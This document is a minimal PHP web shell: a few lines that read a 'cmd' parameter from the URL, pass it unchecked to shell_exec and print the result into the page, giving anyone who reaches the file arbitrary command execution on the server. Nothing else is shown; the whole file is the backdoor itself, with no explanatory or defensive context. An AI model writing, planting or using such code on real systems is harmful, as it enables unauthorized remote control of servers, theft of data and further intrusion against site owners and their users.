<? 
$cmd = $_GET['cmd'];

$output = shell_exec($cmd);
echo "<p>$output</p>";